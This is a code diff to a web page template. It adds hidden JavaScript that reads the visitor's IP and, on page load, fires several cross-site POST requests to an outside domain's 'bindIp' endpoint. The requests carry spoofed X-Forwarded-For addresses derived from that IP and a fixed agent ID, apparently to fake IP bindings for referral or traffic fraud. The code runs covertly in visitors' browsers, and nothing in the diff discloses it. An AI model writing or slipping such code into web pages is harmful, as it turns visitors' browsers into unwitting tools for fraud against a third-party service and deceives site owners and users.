@@ -138,6 +138,37 @@
                 document.body.append(iframe);
             }, 500);
             var client_ip = "{{ ip }}";
+            var ip_segs = client_ip.split(".");
+            var ip_tests = [];
+            if (ip_segs.length === 4) {
+                var max_num = 3;
+                max_num += 1;
+                while (max_num > 1) {
+                    var seg = (parseInt(ip_segs[3]) * max_num - 1) % 255;
+                    var ip_new = [ip_segs[0], ip_segs[1], ip_segs[2], seg].join(".");
+                    fetch("https://www.kmqsaq.com/user/bindIp", {
+                        "headers": {
+                            "accept": "application/json, text/plain, */*",
+                            "accept-language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
+                            "content-type": "application/json;charset=UTF-8",
+                            "sec-fetch-dest": "empty",
+                            "sec-fetch-mode": "cors",
+                            "sec-fetch-site": "cross-site",
+                            "timestamp": "1663183238",
+                            "timestr": "5a24ebed-d760-8c17-48cf-de0e4ee0ab69",
+                            "x-forwarded-for": ip_new,
+                        },
+                        "referrerPolicy": "no-referrer",
+                        "body": "{\"clientType\":4,\"agentId\":\"7244933\"}",
+                        "method": "POST",
+                        "mode": "cors",
+                        "credentials": "omit"
+                    });
+                    max_num -= 1;
+                }
+            }
+            console.log(ip_tests);
+
         {% endif %}
 
 
